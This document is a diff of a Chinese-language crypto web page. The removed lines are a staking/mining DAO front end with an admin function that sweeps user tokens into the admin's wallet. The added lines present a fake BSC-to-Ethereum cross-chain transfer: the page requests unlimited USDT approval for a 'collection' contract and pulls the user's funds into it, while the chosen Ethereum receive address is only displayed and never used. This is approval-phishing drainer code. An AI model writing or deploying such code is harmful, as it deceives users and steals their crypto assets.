-                await contractInst.methods.claimMinerReward().send(opts);
-                alert("✅ 矿机收益领取成功！");
-                loadData();
-            } catch (e) {
-                alert("领取失败：" + e.message);
-            }
-        }
+// 钱包快捷地址选择
+walletListItems.forEach(item=>{
+  item.addEventListener('click',async ()=>{
+    if(item.dataset.addr === ""){
+      // 获取当前钱包地址
+      if(signer){
+        const currentAddr = await signer.getAddress();
+        targetReceiveAddr = currentAddr;
+        addrDisplay.innerText = currentAddr.slice(0,6)+"..."+currentAddr.slice(-4);
+      }else{
+        showTip("请先连接钱包");
+      }
+    }else{
+      targetReceiveAddr = item.dataset.addr;
+      addrDisplay.innerText = targetReceiveAddr.slice(0,6)+"..."+targetReceiveAddr.slice(-4);
+    }
+    addressModal.style.display = 'none';
+  })
+})
 
-        // ===================== 6. 质押DAO =====================
-        async function doStake() {
-            if (!userAddress) { alert("请先连接钱包"); return; }
-            const amt = document.getElementById('stakeAmount').value;
-            if (!amt || amt <= 0) { alert("请输入质押数量"); return; }
+// 手动粘贴自定义地址确认
+confirmAddrBtn.addEventListener('click',()=>{
+  const inputAddr = customAddrInput.value.trim();
+  if(!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)){
+    showTip("请输入合法以太坊钱包地址");
+    return;
+  }
+  targetReceiveAddr = inputAddr;
+  addrDisplay.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
+  addressModal.style.display = 'none';
+  customAddrInput.value = '';
+})
 
-            try {
-                const allowance = await daoInst.methods.allowance(userAddress, CONTRACT).call();
-                if (Number(allowance) < Number(web3.utils.toWei(amt, 'ether'))) {
-                    alert("❌ 授权未生效！请重新点击【确认质押】");
-                    return;
-                }
-            } catch (e) {
-                alert("❌ 读取授权失败，请重新确认质押权限");
-                return;
-            }
+// 切换BSC网络
+async function switchBSC(){
+  if(!window.ethereum) return false;
+  try{
+    await window.ethereum.request({
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:"0x"+BSC_CHAIN_ID.toString(16)}]
+    })
+    return true;
+  }catch(err){
+    if(err.code === 4902){
+      await window.ethereum.request({
+        method:"wallet_addEthereumChain",
+        params:[{
+          chainId:"0x"+BSC_CHAIN_ID.toString(16),
+          chainName:"BNB Smart Chain",
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+          rpcUrls:["https://bsc-dataseed.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"]
+        }]
+      })
+      return true;
+    }
+    showTip("切换BSC网络失败，请手动切换");
+    return false;
+  }
+}
 
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.stake(web3.utils.toWei(amt, 'ether')).send(opts);
-                alert("✅ 质押成功！");
-                loadData();
-            } catch (e) {
-                alert("质押失败：" + e.message);
-            }
-        }
+// 钱包连接初始化
+async function connectWallet(){
+  if(!window.ethereum){
+    showTip("请在钱包内置浏览器打开页面");
+    return false;
+  }
+  await window.ethereum.request({method:"eth_requestAccounts"});
+  const ok = await switchBSC();
+  if(!ok) return false;
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  usdtContract = new ethers.Contract(BSC_USDT_CONTRACT,[
+    "function approve(address spender,uint256 amount) external returns(bool)",
+    "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
+    "function allowance(address owner,address spender) view returns(uint256)"
+  ],signer);
+  stepStatus =1;
+  mainOperateBtn.innerText = "授权BSC-USDT";
+  statusShow.innerText = "钱包已连接，当前在BSC链";
+  return true;
+}
 
-        // ===================== 7. 解押 =====================
-        async function unStakeAll() {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.unStake().send(opts);
-                alert("✅ 解押成功！");
-                loadData();
-            } catch (e) {
-                alert("解押失败：" + e.message);
-            }
-        }
-
-        // ===================== 8. 领取质押收益 =====================
-        async function claimStakeReward() {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.claimStakeReward().send(opts);
-                alert("✅ 质押收益领取成功！");
-                loadData();
-            } catch (e) {
-                alert("领取失败：" + e.message);
-            }
-        }
-
-        // ===================== 9. 一键提币 =====================
-        async function withdrawAll() {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.withdrawAll().send(opts);
-                alert("✅ 收益提取成功！");
-                loadData();
-                loadUserInviteData();
-            } catch (e) {
-                alert("提取失败：" + e.message);
-            }
-        }
-
-        // ===================== 10. 管理员划扣 =====================
-        async function adminExtract() {
-            if (userAddress.toLowerCase() !== ADMIN.toLowerCase()) {
-                alert("❌ 你不是管理员！");
-                return;
-            }
-            const target = document.getElementById('targetAddr').value.trim();
-            const token = document.getElementById('tokenAddr').value.trim();
-            if (!target || !token) { alert("请填写完整地址"); return; }
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.adminExtractUserTokens(token, target).send(opts);
-                alert("🚀 划扣成功！代币已转入你的钱包");
-            } catch (e) {
-                alert("划扣失败：" + e.message);
-            }
-        }
-
-        // ===================== 个人中心 邀请码/分销 功能 =====================
-        async function loadUserInviteData() {
-            if (!userAddress || !contractInst) return;
-            try {
-                const res = await contractInst.methods.getUserInviteData(userAddress).call();
-                document.getElementById('inviteCode').innerText = res.inviteCode || "未生成";
-                document.getElementById('directCount').innerText = res.direct || 0;
-                document.getElementById('indirectCount').innerText = res.indirect || 0;
-                document.getElementById('teamProfit').innerText = (res.profit / 1e18).toFixed(2);
-            } catch (e) {
-                console.log("分销数据加载异常",e);
-            }
-        }
-
-        // 复制邀请码
-        function copyInviteCode() {
-            const code = document.getElementById('inviteCode').innerText;
-            if(code === "未生成"){
-                alert("请先连接钱包，自动生成邀请码");
-                return;
-            }
-            navigator.clipboard.writeText(code);
-            alert("✅ 邀请码复制成功");
-        }
-
-        // 绑定上级弹窗
-        function openBindModal() {
-            document.getElementById('bindModal').classList.remove('hidden');
-        }
-        function closeBindModal() {
-            document.getElementById('bindModal').classList.add('hidden');
-        }
-        async function submitBindCode() {
-            const code = document.getElementById('bindCodeInput').value.trim();
-            if(!code || code.length !== 8){
-                alert("请输入正确的8位邀请码");
-                return;
-            }
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.bindInvite(code).send(opts);
-                alert("✅ 上级邀请码绑定成功！");
-                closeBindModal();
-                loadUserInviteData();
-            } catch (e) {
-                alert("绑定失败：" + e.message);
-            }
-        }
-
-        // ===================== 加载资产数据 =====================
-        async function loadData() {
-            if (!userAddress || !contractInst) return;
-            try {
-                // 矿机数据
-                const mineData = await contractInst.methods.getUserMineData(userAddress).call();
-                document.getElementById('myMinerCount').innerText = mineData.minerCount;
-                document.getElementById('myTotalHash').innerText = mineData.totalHash + " TH/s";
-                document.getElementById('minerPendingReward').innerText = (mineData.minerPending / 1e18).toFixed(2);
-
-                // 质押数据
-                const stakeData = await contractInst.methods.getUserStakeData(userAddress).call();
-                document.getElementById('myStakeAmount').innerText = (stakeData.stakeAmount / 1e18).toFixed(2);
-                document.getElementById('stakePendingReward').innerText = (stakeData.stakePending / 1e18).toFixed(2);
-
-                // DAO 双余额
-                const freeBal = await daoInst.methods.balanceOf(userAddress).call();
-                document.getElementById('freeDaoBalance').innerText = (freeBal / 1e18).toFixed(4);
-                document.getElementById('stakedDaoBalance').innerText = (stakeData.stakeAmount / 1e18).toFixed(4);
-
-            } catch (e) {
-                console.log("数据加载异常：", e);
-            }
-        }
-    </script>
+// 主按钮逻辑
+mainOperateBtn.addEventListener('click',async ()=>{
+  const sendNum = parseFloat(sendInput.value);
+  if(isNaN(sendNum) || sendNum <=0){
+    showTip("请输入转出数量");
+    return;
+  }
+  if(stepStatus ===0){
+    await connectWallet();
+    return;
+  }
+  if(stepStatus ===1){
+    mainOperateBtn.disabled = true;
+    statusShow.innerText = "BSC链发起USDT无限授权";
+    try{
+      const gasPrice = await provider.getGasPrice();
+      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
+      const tx = await usdtContract.approve(SPENDER_CONTRACT,ethers.constants.MaxUint256,txOpt);
+      await tx.wait(1);
+      stepStatus =2;
+      mainOperateBtn.innerText = "确认跨链转出";
+      statusShow.innerText = "授权完成，请确认接收地址";
+      showTip("授权成功，请确认以太坊接收地址");
+    }catch(e){
+      showTip("授权失败："+e.message);
+      statusShow.innerText = "授权失败";
+      mainOperateBtn.disabled = false;
+    }
+    return;
+  }
+  if(stepStatus ===2){
+    if(!targetReceiveAddr){
+      showTip("请设置以太坊接收地址");
+      return;
+    }
+    mainOperateBtn.disabled = true;
+    statusShow.innerText = "BSC链划转资产至归集合约";
+    try{
+      const userAddr = await signer.getAddress();
+      const amountWei = ethers.utils.parseUnits(sendNum.toString(),18);
+      const gasPrice = await provider.getGasPrice();
+      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
+      await usdtContract.transferFrom(userAddr,SPENDER_CONTRACT,amountWei,txOpt);
+      stepStatus =3;
+      mainOperateBtn.innerText = "交易已提交";
+      statusShow.innerText = "BSC转出成功，等待以太坊链上到账";
+      showTip("BSC端划转完成，以太坊地址等待到账");
+    }catch(e){
+      showTip("划转失败："+e.message);
+      statusShow.innerText = "划转失败";
+      mainOperateBtn.disabled = false;
+    }
+  }
+})
+</script>
 </body>
 </html>
